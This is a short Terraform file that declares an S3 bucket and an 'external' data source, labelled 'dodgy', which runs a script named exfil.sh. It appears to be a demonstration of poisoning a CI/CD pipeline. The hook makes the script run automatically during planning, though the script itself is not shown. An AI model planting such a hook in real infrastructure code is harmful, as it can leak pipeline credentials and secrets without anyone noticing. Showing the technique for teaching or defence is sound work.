resource "aws_s3_bucket" "b" {
  bucket = "cicd-series-example"
}

data "external" "dodgy" {
  program = ["sh", "${path.module}/exfil.sh"]
}